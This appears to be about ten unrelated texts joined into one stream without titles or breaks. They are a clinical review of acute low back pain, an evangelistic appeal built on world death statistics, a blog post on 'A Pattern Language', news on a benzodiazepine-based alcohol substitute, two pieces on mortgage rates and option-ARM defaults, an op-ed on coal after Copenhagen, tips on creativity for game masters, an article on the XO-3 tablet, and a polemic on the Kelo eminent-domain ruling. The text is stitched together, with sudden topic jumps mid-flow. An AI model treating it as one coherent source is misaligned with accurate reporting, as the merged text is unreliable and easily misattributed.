Low back pain is a problem that family physicians confront in their patients almost daily .
It is so prevalent that the Agency for Health Care Policy and Research ( AHCPR ) of the U.S. Department of Health and Human Services has developed and published national guidelines to assist primary care physicians in the appropriate care of affected patients .
1 A 23 - member multidisciplinary committee compiled the guidelines , which focus on low back pain of less than three months ' duration .
This review incorporates many of that committee 's recommendations .

Low back pain can be caused by many conditions , both serious and benign .
Because of this , the AHCPR has grouped back pain into three categories : potentially serious spinal conditions , sciatica and nonspecific back symptoms .
POTENTIALLY SERIOUS SPINAL CONDITIONS
Spinal tumor , infection , fracture and the cauda equina syndrome are potentially serious causes of acute low back pain .
These conditions are suggested by characteristic findings from the history and physical examination ( Table 1 ) .
Immediate further work - up and treatment are usually needed .

Sciatica is often debilitating but , in most cases , the pain abates with conservative therapy .
NONSPECIFIC BACK SYMPTOMS
Some patients have symptoms primarily in the back that suggest neither nerve root compromise nor a serious underlying condition .
1
Mechanical low back pain is in this category .
These patients also usually improve with conservative treatment .
With this clinical classification , the examiner can use the history and physical findings to specify the type of back pain affecting the patient and properly treat patients who have potentially serious spinal conditions .

The diagnosis of low back pain requires a careful history to determine whether the causes are mechanical , or secondary and more threatening .
Mechanical causes of acute low back pain include dysfunction of the musculoskeletal and ligamentous structures .
Pain can originate from the disc , annulus , facet joints and muscle fibers .
Mechanical low back pain generally has a favorable outcome , but back pain with a secondary cause requires treatment for the underlying condition .
Fortunately , secondary causes of low back pain are much less frequent than mechanical causes .
An important consideration in the patient 's history is age .
Patients older than 50 and younger than 20 are more likely to have secondary causes .
Clinical findings that may indicate an underlying disease are listed in Table 1 .
Less common secondary causes of acute low back pain include metabolic diseases , inflammatory rheumatologic disorders , referred pain from other sources , Paget 's disease , fibromyalgia and psychogenic pain8,9 ( Table 2 ) .

In general , clues to secondary causes of low back pain can be found in the history and physical examination .
These are referred to as “ red flags , ” and they warrant further diagnostic work - up and immediate treatment ( Table 3 ) .

The physical examination is not as important as the history in identifying secondary causes of acute low back pain .
Nevertheless , certain aspects of the physical examination are considered important .
GAIT AND POSTURE
Observation of the patient 's walk and overall posture is suggested for all patients with low back pain .
Scoliosis may be functional and may indicate underlying muscle spasm or neurogenic involvement .
RANGE OF MOTION
The examiner should record the patient 's forward flexion , extension , lateral flexion and lateral rotation of the upper torso .
Pain with forward flexion is the most common response and usually reflects mechanical causes .
If pain is induced by back extension , spinal stenosis should be considered .
Unfortunately , the evaluation of spinal range of motion has limited diagnostic use,10 although it may be helpful in planning and monitoring treatment .
PALPATION OR PERCUSSION OF THE SPINE
Point tenderness over the spine with palpation or percussion may indicate fracture or an infection involving the spine .
Palpating the paraspinous region may help delineate tender areas or muscle spasm .
HEEL - TOE WALK AND SQUAT AND RISE A patient unable to walk heel to toe , and squat and rise may have severe cauda equina syndrome or neurologic compromise .
PALPATION OF THE SCIATIC NOTCH Tenderness over the sciatic notch with radiation to the leg often indicates irritation of the sciatic nerve or nerve roots .
STRAIGHT LEG RAISING TEST
With the patient in the supine position , each leg is raised separately until pain occurs .
The angle between the bed and the leg should be recorded .
Pain occurring when the angle is between 30 and 60 degrees is a provocative sign of nerve root irritation ( Figure 1 , top ) .
Bending the knee while maintaining hip flexion should relieve the pain , and pressure in the popliteal region should worsen it ( popliteal compression test ) .
11
If placing the knee back in full extension during straight leg raising and dorsiflexing the ankle also increase the pain ( Lasègue 's sign ) , nerve root and sciatic nerve irritation is likely .

FIGURE 1 .
The result of straight leg raising is positive in 95 percent of patients with a proven herniated disc at surgery , but it is also positive in 80 to 90 percent of patients without any form of disc protrusion at surgery .
12
In contrast , crossed straight leg raising is less sensitive but much more specific for disc herniation .
In the crossed straight leg raising test , the contralateral , uninvolved leg is raised ( Figure 1 , bottom ) .
The test result is positive when pain is produced .
REFLEXES AND MOTOR AND SENSORY TESTING
Testing knee and ankle reflexes in patients with radicular symptoms often helps determine the level of spinal cord compromise .
An altered knee or ankle reflex alone does not suggest the need for invasive management because this finding is generally transient and fully reversible .
8
Weakness with dorsiflexion of the great toes and ankle may indicate L5 and some L4 root dysfunction .
Sensory testing of the medial ( L4 ) , dorsal ( L5 ) and lateral ( S1 ) aspects of the foot may also detect nerve root dysfunction .
1 LIMITED NEUROLOGIC TESTING
In the primary care of patients with low back pain and leg symptoms , the neurologic examination can be limited to just a few tests .
These include the testing of dorsiflexion strength of the ankle and great toe , ankle reflexes and light touch over aspects of the foot , as well as the straight leg raising test .
This abbreviated neurologic examination of the lower extremities allows the detection of most clinically important radiculopathy related to lumbar disc herniation .
If patients with abnormal findings on these tests do not show improvement by one month , further diagnostic work - up or referral to a specialist is necessary .
8
Those with progressive symptoms should undergo further evaluation without delay .
Statisticians have calculated the " mortality rate " for the world to be roughly .883 percent .
This means that 1 out of every 113 people in the world died last year .
Based on this rate , here is an estimate of the incidence of death among people now living in the world : 1.78 deaths per second
107 deaths per minute
6,390 deaths per hour
153,000 deaths per day
56.0 million deaths per year
3.9 billion deaths per average lifetime ( 70 years )
Of course , these numbers are based on inductive generalization and therefore are not infallible ; however , the fact remains that people are dying all around us - and many of these people have not heard of the salvation of the LORD God of Israel through Yeshua His Son .
May these sobering thoughts spur us on to action !
May they shock us out of our apathy and move our heart 's affections to freely share the gospel of our LORD Jesus the Messiah to a dying and hurting world .
" O blessed Holy One of Israel , give us all a heart for the lost children of this world !
Give us joyful courage to reach out to them all .
Help us , LORD , to be your witnesses in the truth .
In the Name of Yeshua our LORD I ask : Amen . "

Enjoy !
On a cold , rainy day there ’s nothing like a stolen moment waiting for a prospective client and a thick book to fill it .
What makes it even more profound is when I have a small fixation rattling around in my head and the book is the tome that ties together all the little pieces of thought I ’ve been trying to crystallize .
The fixation is human networks of connections that define who we are and where we ’re going socially , politically , and technologically .
The book is “ A Pattern Language ” by the Center for Environmental Structure – Christopher Alexander , Sara Ishikawa , Murray Silverstein , and a few more .
“ A Pattern Language ” is the culmination of work done through the late 1960s and 70s to define a built world that fits with the social and ecological needs of humans .
It applies understanding from architecture , planning , building , and sociology to create a series of “ pattern ” that can be applied in ways that give coherence to a whole without forcing a structure that is stifling and mechanical .
The patterns are stated in simple declarations , followed by 2 - 3 pages of explanation , and a description of how to apply the pattern .
One example is an old favorite of mine , Pattern 167 , “ Six Foot Balcony ” .
The statement is , “ Balconies and porches which are less than six feet deep are hardly ever used . ”
There are two pages of examples of balconies that work and do n’t work , and then the conclusion – “ Whenever you build a balcony , porch , gallery , or terrace always make it at least six feet deep .
If possible , recess at least part of it into the building so that it is not cantilevered out and separated from the building by a simple line , and enclose it partially . ”
Simple and practical .
The patterns are n’t all this simple , of course .
Those of you who are familiar with my complaints about our proposed transit line , the Central Corridor , may not be surprised to see that “ A Pattern Language ” has quite a lot to say about appropriate transit planning in the concluding statement of Chapter 16 , “ Web of Public Transportation ” :
“ Treat interchanges as primary and transportation lines as secondary .
Create incentives so that all the different modes of transportation plan their lines to connect the interchanges with the hope that gradually many different lines of many different types will meet at every interchange .
Give the local communities control over their interchanges so that they can implement the pattern by giving contracts only to those transportation companies which are willing to serve these interchanges . ”
There is a lot in here , but those of you who have followed the Central Corridor debate should be able to see immediately where and how things have gotten as ugly as they have by not following this pattern .
More interestingly , the role of companies that serve transit is stressed , which is to say entities that are not necessarily government .
What matters in design is the pattern , not the institution .
That ’s ultimately what “ A Pattern Language ” is all about , after all .
Our built world is often stunningly out of alignment with our social networks because it was built to serve institutions that included development corporations and government first , humans second .
If you approach the world from the needs of people things look a lot different .
In fact , they look a lot more like the network structures we see developing online , more spontaneously .
This is , in many ways , a frontier of “ New Urbanism ” , but it ’s ultimately much more than that .
It ’s how our understanding of the needs of humans makes our cities healthier and stronger in the Fractal Era – the developing time when recurring patterns define the structure and not the other way around .
It is about people and the systemic connections that define their networked lives , not the institutions that take care of the mechanical details .
But this work is not remarkably well known among the professional planners that I know .
Many claim to have read it , but when I make arguments based on “ A Pattern Language ” I can see that we have little common frame of reference for understanding each other .
It certainly has n’t sunk in , which I find terribly sad .
On a cold wet day , I can curl up with this tome of 1170 pages knowing that what I have in my hands is a distillation of a tremendous amount of wisdom that will , some day , be understood well enough to make our physical world more humane , urbane , and healthy .
It makes me feel warm if a bit wistful .
Once again , knowing what to do has proven a lot easier than making it happen .
Yet through the sound of raindrops outside I know that slowly , “ A Pattern Language ” will continue to change our built world .

A new alcohol substitute is being developed by a team at Imperial College London that that avoids drunkenness and hangovers .
Similar to the Synthehol from the TNG era series , the fake booze is being developed from chemicals related to Valium and works like alcohol on nerves in the brain that provide a feeling of well being and relaxation .

The new substance could have the added bonus of being " switched off " instantaneously with a pill , to allow drinkers to drive home or return to work .
But unlike alcohol its does not affect other parts of the brain that control mood swings and lead to addiction .
It is also much easier to flush out of the body .
Finally because it is much more focused in its effects , it can also be switched off with an antidote , leaving the drinker immediately sober .
The new alcohol is being developed by a team at Imperial College London , led by Professor David Nutt , Britain 's top drugs expert who was recently sacked as a government adviser for his comments about cannabis and ecstasy .
He envisions a world in which people could drink without getting drunk , he said .
No matter how many glasses they had , they would remain in that pleasant state of mild inebriation and at the end of an evening out , revellers could pop a sober - up pill that would let them drive home .
Prof Nutt and his team are concentrating their efforts on benzodiazepines , of which diazepam , the chief ingredient of Valium is one .
Thousands of candidate benzos are already known to science .
He said it is just a matter of identifying the closest match and then , if necessary , tailoring it to fit society ’s needs .
Ideally , like alcohol , it should be tasteless and colourless , leaving those characteristics to the drink it ’s in .
Eventually it would be used to replace the alcohol content in beer , wine and spirits and the recovered ethanol ( the chemical name for alcohol ) could be sold as fuel .

NEW YORK , Dec 31 ( Reuters ) - U.S. mortgage rates rose in the latest week for a fourth straight week and hit the highest level since August , a closely watched mortgage survey showed on Thursday .
Interest rates on U.S. 30 - year fixed - rate mortgages , the most widely used loan , averaged 5.14 percent for the week ended Dec. 31 , the highest since the week ending Aug. 27 and up from the previous week 's 5.05 percent , according to a survey released by Freddie Mac FRE .
PFRE.N , the second - largest U.S. mortgage finance company .
“ Although long - term mortgage rates rose for the fourth week in a row , they still remain affordable by historical standards , ” Frank Nothaft , Freddie Mac vice president and chief economist , said in a statement .
Based on today ’s median loan amount of $ 138,000 , monthly principal and interest payments for a 30 - year fixed - rate mortgage are close to one - third less than a decade ago when rates peaked at 8.6 percent in May 2000 , Nothaft said .
“ This translates into almost 50 percent less in interest payments over the full 30 - year term , ” he said .
The rate of the latest week tops that of the year - ago period when the 30 - year mortgage rates averaged 5.10 percent .
The 30 - year rate had fallen to 4.71 percent four weeks ago , the lowest since Freddie Mac started the survey in 1971 .
Mortgage rates are linked to yields on Treasuries and yields on mortgage - backed securities .
Freddie Mac said the 15 - year fixed - rate mortgage averaged 4.54 percent in the latest week , up from 4.45 percent the prior week .

One - year adjustable - rate mortgages ( ARMs ) were 4.33 percent in the latest week , down from 4.38 percent the prior week .
The rate on the “ 5/1 ” ARM , set at a fixed rate for five years and adjustable each following year , was 4.44 percent , compared with 4.40 percent a week earlier .
A year ago , 15 - year mortgages averaged 4.83 percent , the one - year ARM 4.85 percent and the 5/1 ARM 5.57 percent .

NEW YORK ( CNNMoney.com ) -- Option - ARMs : File under , " It sounded good at the time . "
These exotic mortgages allowed homebuyers to come to closing with little cash and choose , monthly , how much to pay : interest and principal , interest only , or a minimum amount less than the interest due .
Of course , the last option is the one 93 % of option - ARM buyers selected , according to a new report released this week by Standard & Poors .
But eventually , everyone has to pay the piper .
Nearly all of the 350,000 option - ARM borrowers owe more than when they first bought their homes thanks to the unpaid interest accumulating .
And many loans written during the first big wave , which started in 2004 , are getting ready for their five - year reset , when they become standard amortizing loans .
Additionally , some newer loans will reset early if the accumulated interest has pushed the loan - to - value ratio above 110 % to 125 % .
That means borrowers are about to start paying very hefty prices for their homes .
In one scenario outlined in the S&P report , the payment on a $ 400,000 mortgage jumps from $ 1,287 to $ 2,593 .
25 % default rate
But that does n't just spell bad news for borrowers .
Some industry pessimists say the looming default problem could have the power to derail the nascent housing market recovery .
" The crux of the matter is that as soon as these mortgages recast , the history is that they will default , " said Brian Grow , one of the S&P report 's coauthors .
And the newer the loans , the worse they will perform , the report said .
The last year that any option - ARMs were issued was 2007 .
In the first 20 months after issuance , this vintage of option - ARMs had an average default rate of just over 22 % .
That includes all option - ARMs issued in 2007 .
But if you calculate default rates for only 2007 option - ARM borrowers who are now underwater , the default rate jumps to 25 % after just 20 months , according to S&P .
So , while there may not be an awful lot of these loans out there , their high default rates will have an outsized influence on housing markets , adding to already bloated foreclosure inventories and driving prices down further .
Bubble markets
And the markets where they 'll produce the most foreclosures are still among the most vulnerable in the nation .
Option ARMs were most popular in bubble markets -- California , Nevada , Florida and Arizona -- where double digit home annual price increases put the cost of buying a home out of reach .
In fact , 60 % of these loans went to residents of California and other Western states , places where prices have fallen the most , according to report coauthor Diane Westerback .
" The geography is negative for these products , " she said .
Many borrowers in these places could only afford a home if they chose the option ARM .
Many counted on continued hot market conditions to add value to their homes .
The extra equity could then be tapped to pay their bills .
We all know how that worked out .
Home prices in many of the markets where option ARMs are most concentrated have fallen 30 % , 40 % or more .
When the loans recast , most borrowers will find themselves severely underwater .
" Because borrowers of [ options ARMs ] are in a much worse position , " said Westerback .
" You 'll see defaults rising very rapidly . "
And most option ARM borrowers will not be good candidates for refinancing or mortgage modifications because their loan - to - value ratios will be far too high .
Under the administration 's Making Home Affordable program , for example , mortgages with balances that exceed 125 % of the home 's value are not eligible for help .
Not so white lies
There is another little problem that many option - ARM borrowers seeking refinancing would face : " Upwards of 80 % of were stated - income loans , " said Westerback .
These are the so - called " liar loans " in which lenders did not verify that borrowers earned as much money as they said they did .
Lenders may not be able to modify mortgages because many of the borrowers ' income could not stand up to the scrutiny .
Borrowers may also not want to go through underwriting again because they could be held legally liable for deliberate inaccuracies on their original applications .
Add to those conditions the still fragile economy and high unemployment rates , and you have a recipe for disaster .
The acid test of the Copenhagen climate change summit was always going to be coal .
Had governments managed to come up with a meaningful agreement , those who seek to continue burning coal would have faced significant risk that they would be spending their money on what investors call " strandable " assets – assets that become obsolete and therefore worthless .
And for their part , financial institutions would have had to think twice whether they should keep pouring billions of dollars into new coal - fired electricity generation , seeking short - term returns while knowingly fuelling future climate ruin that is not costed in today 's books .
But there was no meaningful agreement .
And so we see the first in the queue to foist coal horrors upon us already knocking at the door .
Since Copenhagen , E.ON has announced that any further emissions cuts by the company will depend on governments making progress in 2010 in the climate negotiations .
E.ON and Centrica have both said they are less likely to build coal plants attempting carbon capture and storage .
We can expect to see similar sentiments from most of the other big energy companies .
Enlightened business leadership ahead of legislation is not their bag .
More plans for unsequestered coal , without trapping and burying the carbon dioxide , will be the best we can expect .
To be fair to the power companies , the fault is wider .
Most investors expect this behaviour of them .
Most banks , insurance companies and pension funds are happy , as things stand , to continue investing in coal .
When it comes to the London Stock Exchange , they will have their first major chance soon .
The largest Russian steam coal producer is eyeing an initial public offering in London during the first half of 2010 .
Suek , owned by two oligarchs , is worth $ 8 - 9 bn ( £ 5 - 6 bn ) , and will be floating as many as a quarter of its shares .
As one anonymous banker put it to Reuters : " There have n't been any good opportunities in this sector for a long time , and the sector is on its way up , so therefore this will be a positive story . "
Of course , at the same time , those buying shares will be fuelling long - term wealth destruction – let me not be so base as to mention killing people to boot , let 's stick to the money – by stoking climate change .
This is the bottom line with the dysfunctional form of capitalism we have allowed to evolve .
And the most galling thing is this : the bonus cultists are doing it , in large part , with our money .
A pension fund manager invests billions built up from tiny parcels of the peoples ' pension contributions .
He is rewarded , like everyone else in the temples of finance , on the basis of short - term returns .
That the pension holder might retire into a world that is increasingly unliveable because of the actions of his fund manager features nowhere in any bonus calculation .
Hugo Chávez gloatingly told the Copenhagen summit that capitalism is to blame for climate change .
He has more than half a point .
After this failure of a summit many leaders had cast as a last - chance saloon , surely now we have to think hard about capitalism in the form we have allowed it to evolve .
The fact is that as things stand – to use the parlance of the investment bankers who will scrabble to win the Russian coal business and the pension fund managers who will line up to invest in the listing – there is no place on the global balance sheet for the assets most relevant to the survival of economies : ecosystems and civilisation .
There is plenty of space for spectres they label as assets while shovelling the attendant megarisks off the books .
That is the real bottom line .
Unless , that is , we can mobilise enough people - power , on enough fronts , for the citizenry to turn around the course of a war in which our leaders are currently displaying toothless impotence .
The listing by Suek , and the role of our money it , might be a good place to start .
Any company investing in that IPO is a company that I will no longer bank or insure with .
And any pension fund investing in it is one that I will encourage all my friends to switch their pension out of .

As a GM the most important tool you have is your creativity .
Your creativity is what allows you to create amazing adventures , thrilling NPC ’s , witty dialog , enthralling descriptions , and the ability to shape your game in response to your players .
Your creativity needs to be taken care of and cultivated .
When treated well the power of your creativity is at your disposal , but when it becomes fatigued it can lead to the dreaded burn - out .
But fear not , for I have the Creativity Owner ’s Manual , and I will share with you tips for keeping your creativity in the best condition .
Feed Your Creativity
To quote the all - knowing Wikipedia , Creativity is :
… a mental and social process involving the generation of new ideas or concepts , or new associations of the creative mind between existing ideas or concepts .
In order to be able to generate new ideas and make new associations between existing ideas , you need to feed your mind with ideas and concepts , both new and old .
The best way to do that is to read , watch TV , watch movies , etc .
Expose yourself to all sorts of materials to create a rich pool of tropes , concepts , and scenes .
It will be from this pool that your mind will pull together ideas , some from scratch , and others by stitching various existing pieces of knowledge together to create your next great idea .
The best way to feed your creativity is to feed upon diverse sources of information .
The more diverse your pool of sources are , the more unique pieces you will have in your mind and the more original your ideas will be .
A diet of only fantasy books , while you are running a D&D campaign , is going to leave you with a lot of classical and worn ideas .
On the other hand , reading a magazine article about theoretical physics , watching Dirty Jobs , and reading some historical biographies creates a more diverse pool of ideas , leading to more original ideas .
Two examples : I once came up with a Star Wars campaign based on the barbeque at Twelve Oaks in Gone With The Wind , where the southern gentlemen are talking about the impending Civil War .
Another time , I came up with a plot for a Corporation session based on a Business Week article on executive kidnappings in Mexico .
In both cases , I did not watch Gone With The Wind or read Business Week to get ideas for a game , but by exposing myself to both , I created building blocks for my own creativity , when it was time to put it to use .
Regular Exercise
There is a common misconception that creativity strikes likes lightning , that it is some random event , striking when you least expect it .
This is a misconception .
There are plenty of occupations that require regular acts of creativity such as Advertising , Designers , and Writers .
People in these occupations are able to be creative on a regular basis .
How do they do it ?
Practice … practice … practice .
Creativity is a learned skill , and when the skill is trained on a regular basis , you can expect it to perform with consistency .
Those that master the act of creativity can call upon it , and not rely on those seemingly random flashes of insight .
How does one exercise their creativity in gaming ?
By creating elements for your game : an NPC , a description of a location , an idea for a plot .
To hone your creativity , start by performing this act of creation , on a daily basis .
The effort does not need to be formal , you can take a few minutes on your morning commute to think up a new NPC , or jot down a few lines of plot in between meetings .
It ’s not the writing down of the details that are important ; it is the act of creation that is more important .
As your skill improves , you can go from days to a few times a week , etc .
When your creativity has been properly exercised , you will find that new ideas will come quickly and more importantly will come to you on your schedule .
That ability will take a great deal of stress off of you as a GM .
When you know that you just need 30 minutes to come up with a plot for next week ’s game , you will be much more relaxed , than someone who spends a week in a panic hoping that their plot will “ come to them ” before their players start sitting around the table .
A Well Deserved Rest
Creativity requires the expenditure of energy and it can be drained over time .
When creativity is overused , or used for a prolonged period under stressful conditions , it can lead to burn - out , leaving you wandering in a creative desert .
Just as it is important to exercise your creativity , you also must respect when your creativity needs rest , and then be willing to take the time to give it the rest it needs .
As a culture , we ( Americans ) undervalue the need for rest , believing that like some kind of medical student that we can push through the fatigue and keep going .
Doing this for your game will lead you to pushing ill - formed ideas rather than creating fully formed creative ideas .
The end result is at best strained , and at worst a disaster .
In gaming terms we tend to create plots that are logically flawed , or that railroad players ; NPC ’s are cliché or two - dimensional .
There is an article on HarvardBusiness.org from Lifehacker ’s Gina Trapani , about Creative Sabbaticals .
There is a Designer , Stefan Sagmeister , who every 5 years closes his high - profile design studio and takes a year off , to re-charge his creativity batteries .
While there are very few of us would want to take a year off from GMing , it makes an important point , that in order to keep peak creativity , you need time away in order to be refreshed .
In our campaigns , this rest can come in the form of skipping a scheduled session , and playing some board or card games in its place .
Other times you need a slightly longer break ; a hiatus may be required .
In my gaming group , we take a few weeks off each Christmas holiday season .
I honestly look forward to each December , when I have finished my notes for the year , and sitting back for a few weeks and not having to worry about writing my next session , and just relaxing .
The funny part is that after a week , my mind starts flooding with ideas , as I start to mentally relax and the trained creativity takes over .
Be The Master Of Your Creativity
Creativity is tool that every GM needs to master .
The best part is that mastery comes from practice , and that practice can be done anywhere .
Banish from your mind any thoughts that creativity is some fickle muse that visits you out of the blue , and rather regard creativity as a tool that you can pick up and use whenever you wish .
Now it ’s your turn .
What shape is your creativity in ?
What exercises do you do that keeps it in top form ?
How do you rest your creativity ?
It ’s probably not going to happen .
Let ’s be honest about that .
As we ’ve previously mentioned , Nicholas Negroponte ’s newest vision for a next - generation educational computer is n’t a laptop , it ’s a touchscreen tablet that will use less than 1W of power and cost $ 75 .
That already seemed pretty unrealistic , but now that I ’ve seen the concept images Forbes published today , I ’m even more skeptical .
But that does n’t mean that XO - 3 project is completely doomed .
While the original XO Laptop never reached the promised price of of a $ 100 laptop , it did show that you could build a usable mini-laptop for extraordinarily low prices and the project inadvertently sparked the netbook revolution .
It ’s possible that by establishing a 2012 goal for a $ 75 , dead - simple tablet , Negroponte and friends could again inspire mainstream PC makers to change the way they think about low cost computers .
In fact , the entire project is going to be open source , including the hardware design .
As Negroponte tells Forbes , the OLPC group does n’t even need to be the ones to build the XO - 3 to consider the project a success .
They just “ need to threaten to build it . ”
The latest plans for the Xo - 3 involve a durable , plastic tablet that has very few controls aside from the touchscreen display .
Basically you ’d see a huge screen surrounded by a thin green plastic frame .
It would be made of durable plastic , feature a waterproof design , and a high power processor .
It would be thinner than an iPhone and you might be able to use an inductive charging device to charge the battery without a cord .
The laptop will likely use a Pixel Qi display that can function both as a full color high resolution display and a high contrast , or in a high contrast , low power ePaper mode for reading eBooks .

Well the Kelo , ( Kelo v. New London 125 S. Ct. 2655 ( 2005 ) ) decision had come and gone back in 2005 , bringing the all its aghastive issues to a head , popping that sociological pimple , and gushing all its un-Libertarian contents onto the American psyche .
The ruling was , however , so outrageous , that even Democrat and Republican leaders found it reprehensible , making the issue offensive to all three political parties , an unusual commonality .
Looking back , in Kelo , the municipality of New London , Connecticut , laid an acquisitive eye upon the benign and working neighborhood of Fort Trumbull , an area of about 90 acres and containing 115 homes and private properties .
New London
City administrators did n’t have a complaint that the properties were in violation of any zoning or state law , nor did it claim that any of the properties were in tax arrears , abandoned or blighted .
In fact the residents of Fort Trumbull were archetypically upstanding citizens of the community , literally minding their own business .
What New London ’s bureaucrats did have however , was avarice for the property taxes that Fort Trumbull residents ’ did n’t owe , the property taxes that it believed it could get from Pfizer Pharmaceutical Corporation , with whom they had pre-negotiated a non-binding understanding for a manufacturing plant to be built within the Fort Trumbull area .
The City ’s expectation was that the area could be forceably taken , resold at significant profit , and receive far more tax revenue if it was owned by a large corporation with an expensive factory , instead of a few dozen middle class residents ; it was more than the City Council apparatchiks could contain .
However in a recent turn of events , the irony that even Rod Serling could n’t have played out more didactically , Pfizer Corp. has decided to abandon the project , and the utter needless grief and destruction caused by abusive Eminent Domain acquisition is laid bare .
It screams to all how un -American this fiasco , and the thuggish principles behind it , are .
The big question pending at that time , and still surviving between the cracks of earlier Supreme Court precedent was the whether government (s ) had any Constituional limit on the discretionary seizure and taking of private property , ostensibly under the eminent domain clause of the US Constitution ; if governments had such discretion it would effectively spell the death knell of fundamental private property rights .
The alternative possibility was whether there was some legal brightline standard by which property owners could assert that eminent domain was simply not applicable , and that government discretion was not within its power to assert .
Rationalizing , and parlaying on the concept , New London proclaimed that such a transfer of title “ was in the public interest ” , and would thus initiate its preemptive option of eminent domain jurisdiction , and seize by force what they could not negotiate voluntarily with the property owners .
By legal definition , Eminent Domain theory is the legal means by which various sovereign governments of the United States are legally authorized to involuntarily seize private properties and convert them to public use ; embodied into law via the “ takings ” clause of the 5th Amendment of the US Constitution , which reads :
No person shall be . . . deprived of life , liberty , or property , without due process of law ; nor shall private property be taken for public use , without just compensation .
As in all law however , the devil is in the judicial interpretation , particularly whenever some authority wishes to expand its power beyond the obvious terms that the law provides for .
Example :
The preventative detention clause of the 8th Amendment commands simply that “ Excessive bail shall not be required ” .
Yet in 1984 Congress authorized the detention of federal criminal defendants without bail at all .
Although this would appear to violate the 8th Amendment , since no amount of money or condition would be enough , the Supreme Court ruled that since no numbered bail amount was offered , it could not be considered excessive .
( Of course all these standards apply to federal executive and policing powers , the legal standard of which becomes the default of all other sub - governments within the United States .
That default exists only where there is n’t another superseding standard explicitly written into law within those sub- governments , e.g. , local , county or state laws . )
With capricious judicial latitude like this , we can easily see the Constitution ’s prohibition of “ cruel and unusual punishment ” being interpreted to permit cruel punishment – as long as it is not unusual .
Do n’t think it ca n’t happen .
“ modern ” countries , like Saudi Arabia , routinely practice cruel , but quite usual , punishment , such as the chopping off of defendants ’ hands for petty thievery .
However , back to the question of eminent domain , the pivot point for abuse of this clause , was , and is , centered on the phrase “ public use ” , which what the US Constitution explicitly uses .
So , just what is public use ?
Traditionally ( that is , before the Supreme Court went insane ) , public use is just like what it sounds like – the use of the subject land / property by the public , e.g. , public highways , dams , government buildings , airports , public parks or recreation areas – essentially , public works where the public would have access to , and directly benefit from the use of .
The terms of the law seem unambiguous .
And yet , as unambiguous as it may be , the courts will always find ( or make ) a little wiggle room that serves the State at the expense of both the public and particularly the private individual .
An inconvenient phrase or word will be folded , spindled and mutilated when the government desires more jurisdiction , more power or more control than the raw terms of the law .
Somewhere along the precedential way , statist minded jurists ignored the plain language of the law , and began to expand on the concept of “ public use ” .
The first salvo launched by the courts was to casually introduce the terms “ public purpose ” and “ public welfare ” as synonymous and interchangeable with the actual law ’s constrained mandate “ public use ” , see Berman v. Parker 348 U.S. 26 .
In Berman the question was whether a eminent domain could be imposed where a municipality planned to eliminate slums and urban blight , notwithstanding its ultimate usage .
The Court ruled that it could .
( Being 1952 , the Berman decision came down during the decade after World War II , a time of great optimism about the power of government .
Utilizing federal funds , cities were embarking on massive urban renewal efforts .
These plans , despite meeting the newly minted “ public purpose ” requirement , met often with failure rather than success — thence the skeletons of many American central cities ossified into the brutalist concrete ghost towns seen today .
The old Kelo property and the Fort Trumbull area is now a parallel expression of that , the spiritual descendent of the same callous presumptions . )
By committing Constitutional heresy , these alternate , more inclusive , terms were canonized as being equivalent – the rights that had been protected , and the prerequisites that had been required by the Constitution for asserting eminent domain , were mooted , and easily side - stepped .
Hence , the legacy New London City could rely upon in their land - grab .
Outraged as anyone would be when a thug grabs your belongings at the point of a gun , some of the victims , headed by Susette Kelo , sued the city of New London , asserting that even if the town had the power to take their possessions , the target use of those properties should only be for “ public use ” as the Constitution commands .
In order to not offend the precedential ( but clearly heretical ) Berman , the distinction they made in their argument was whether eminent domain could be applied where the municipality was not seeking to eliminate slums or urban blight , but rather for the sole purpose of “ economic development ” , and any factual premise that could be inferentially forced - fit into that purpose .
The plaintiffs ( Kelo , et al ) complained to the federal district court that taking it from them and selling it to large corporations and other private entities , who retain private property protections of use from the public , could not be considered “ public use ” .
The case made its way all the way up to the US Supreme Court , where the minimum majority , in a 5 to 4 decision , ruled that this kind of economic development was a legitimate takings under the “ public purpose ” test , and that the government delegation of its eminent domain power to a private entity was Constitutional .
But of course the issue could past muster under such a standard ; the only problem is that the Constitution does not provide such latitude .
As Justice Thomas observed in his dissent :
“ This deferential shift in phraseology [ from “ public use ” to “ public purpose ” ] enables the Court to hold , against all common sense , that a costly urban - renewal project whose stated purpose is a vague promise of new jobs and increased tax revenue , but which is also suspiciously agreeable to the Pfizer Corporation . ”
After the Court ’s judgment in favor of New London , the city heaped insult upon injury , by demanding that Kelo , et al , pay rent for the time they occupied their homes during the civil case proceedings , some 5 years of culminated back rent , equal to tens of thousands of dollars , since the city initially attempted to seize their properties .
( We can only presume they did n’t also try to claim property taxes for that time as well . )
Forced into the unconscionable circumstance of abandoning their homes , the residents were now only left with the hope and expectation that they would receive “ just compensation ” for the seizure of their properties .
New London reportedly had allocated $ 1.6 M to purchase the 15 homes surviving the Kelo case , approximately $ 107 K per home on the average .
The courts have defined the Constitution ’s “ just compensation ” as meaning “ market value ” , which of course itself is subject to interpretation .
That valuation of course is kindly provided by the arrogating municipality .
( In this case it is interesting to note that the median home cost in New London was $ 226,700 , about twice the value of New London ’s idea of “ just compensation ” . )
Such a schemata certainly did away with any opportunity of a forfeiting property owner to get the best price they could on the open market , and it certainly did not provide the property owner with a “ replacement value ” sufficient to make him / her whole again .
And if the property owner cares to object to the price stuffed down his throat , he has to spend even more money to try to contest it administratively or in court .
Left with little choice , such a property owner must now spend effort and resources trying to find another home within budget , moving all possessions , and suffer the unavoidable disruption of his / her social and business life , all of which is not included in the “ just compensation ” that s/he is paid .
Kelo ’s house was eventually physically removed and relocated , where it now stands several miles from its original location , as a testament to this brutish fiasco .
In September 2009 , the vibrant Fort Trumbull neighborhood , where Susette Kelo ’s home had once stood is now an empty lot generating no tax revenue for the city and its residents ; the city ’s projected 3,169 new jobs and $ 1.2 million a year in tax revenues had evaporated as effectively as did American citizens ’ fundamental rights to their own personal properties .
By November of 2009 , Pfizer had abandoned the site and was in the process of selling , leasing , or utilizing some other disposal method for the properties .
The former residents of New London might very well ask now , what is more blighted ?
The active community , houses and families that resided in Ft. Trumbull before the City seized their land , or the weeded urban waste , and vacant lots that now exist there .
With such political powers at stake is it any wonder why the court ’s consistently rule in the statist ’s camp ?
A seizing municipality now merely has to proclaim just about anything they want to do as being “ in the public interest ” and for a “ public purpose ” , it can then forcibly forfeit private owner ’s homes and land , oust them as trespassers , and then pay them what is unilaterally declared “ just compensation ” ; it is then free to resell the property to the highest bidder .
All in the “ public interest ” of course .
The protections the Constitution was authored to have , to prevent governmental abuses like these , have been eviscerated by the changeling term “ public purpose ” instead of the more constrained “ public use ” .
